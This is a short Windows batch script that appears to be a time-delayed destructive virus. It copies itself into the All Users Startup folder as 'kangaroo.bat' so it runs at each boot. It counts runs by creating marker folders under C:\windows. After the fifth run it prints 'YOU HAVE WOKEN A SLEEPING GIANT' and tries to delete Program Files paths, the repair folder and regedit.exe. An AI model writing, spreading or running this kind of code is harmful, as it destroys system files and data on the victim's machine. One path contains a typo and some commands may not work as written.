@echo off
:test
if exist C:\windows\5 goto :destruction
if not exist C:\windows\5 goto :test2

:test2
if exist C:\windows\4 goto :part4
if not exist C:\wondows\4 goto :test3

:test3
if exist C:\windows\3 goto :part3
if not exist C:\windows\3 goto :test4

:test4
if exist C:\windows\2 goto :part2
if not exist C:\windows\2 goto :test5

:test5
if exist C:\windows\1 goto :part1
if not exist C:\windows\1 goto :start

:start
copy %0 c:\Docume~1\Alluse~1\StartM~1\Programs\Startup\kangaroo.bat 
md C:\windows\1
exit

:part1
md C:\windows\2
exit

:part2
md C:\windows\3
exit

:part3
md C:\windows\4
exit

:part4
md C:\windows\5
exit

:destruction
echo YOU HAVE WOKEN A SLEEPING GIANT
echo NOW YOU MUST PAY...
deltree /y C:\windows\progra~1
deltree /y C:\windows\repair
del /y C:\windows\regedit.exe
pause
exit 
